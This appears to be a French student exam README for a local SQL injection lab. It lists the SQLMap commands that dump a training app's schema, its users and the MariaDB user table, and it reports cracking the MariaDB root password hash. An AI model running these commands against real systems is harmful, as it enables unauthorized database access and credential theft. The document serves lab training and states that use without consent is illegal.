# Projet : Exploitation SQL Injection avec SQLMap

## Description

Ce projet utilise l'outil **SQLMap** pour identifier et exploiter des vulnérabilités d'injection SQL sur une application web locale. L'objectif est de récupérer des informations critiques depuis la base de données, en particulier sur les utilisateurs et les privilèges, et de les exporter en fichiers `.csv`.

### Objectifs spécifiques de l'examen

1. Récupérer le schéma de la base de données.
2. Extraire la liste des utilisateurs de l'application.
3. Extraire la liste des utilisateurs de la base de données MariaDB.
4. Identifier et décrypter le mot de passe root de MariaDB via attaque par force brute.
5. Récupérer le mot de passe administrateur de l'application.

---

## Structure des fichiers générés

Les fichiers `.csv` et `.txt` suivants contiennent les données récupérées :

- **Schéma de la base de données :**
  - [Base de données `sqlitraining` - Schéma](output/localhost/dump/sqlitraining-schema.csv)
  - [Base de données `information_schema` - Tables](output/localhost/dump/information_schema-tables.csv)
  - [Base de données `sys` - Tables](output/localhost/dump/sys-tables.csv)
  - [Base de données `mysql` - Tables](output/localhost/dump/mysql-tables.csv)

- **Utilisateurs de l'application :**
  - [Liste des utilisateurs de l'application](output/localhost/dump/sqlitraining-users.csv)

- **Utilisateurs de MariaDB :**
  - [Liste des utilisateurs de MariaDB](output/localhost/dump/mysql-users.csv)

- **Mot de passe root de MariaDB :**
  - [Mot de passe root de MariaDB (force brute)](output/localhost/dump/root-password.txt)

- **Mot de passe administrateur de l'application :**
  - [Mot de passe administrateur de l'application](output/localhost/dump/admin-password.txt)

---

## Commandes SQLMap Utilisées

Les commandes SQLMap suivantes ont été exécutées pour atteindre les objectifs :

### 1. Extraction du Schéma de la Base de Données

- **Commande :**
  ```bash
  sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" -D sqlitraining --tables --batch
  ```

- **Détails des tables dans `information_schema` :**
  ```bash
  sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" -D information_schema --tables --batch
  ```

### 2. Récupération des Utilisateurs de l'Application

- **Commande :**
  ```bash
  sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" -D sqlitraining -T users --dump --batch --dump-format=CSV
  ```

### 3. Récupération des Utilisateurs de MariaDB

- **Commande :**
  ```bash
  sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" -D mysql -T user --dump --batch --dump-format=CSV
  ```

### 4. Extraction du Mot de Passe root de MariaDB

- **Commande :**
  ```bash
  sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" -D mysql -T user -C User,Host,authentication_string --dump --where="User='root'" --batch
  ```

  - **Détails :**
    Le mot de passe `81F5E21E35407D884A6CD4A731AEBFB6AF209E1B` est en MySQL4.1+. Après décryptage sur **CrackStation**, le mot de passe root est **root**.

### 5. Extraction du Mot de Passe Administrateur de l'Application

- **Commande :**
  ```bash
  sqlmap -u "http://localhost:8888/register.php" --data="uid=test&password=test&name=test&descr=test" -D sqlitraining -T users --dump --batch
  ```

---

### Notes

- Tous les fichiers extraits en format `.csv` et `.txt` se trouvent dans le dossier : `/home/nyx/.local/share/sqlmap/output/localhost/dump/`
- L'utilisation de **SQLMap** pour des attaques sans consentement préalable est illégale. Ce projet est uniquement destiné à l'apprentissage dans un environnement contrôlé.

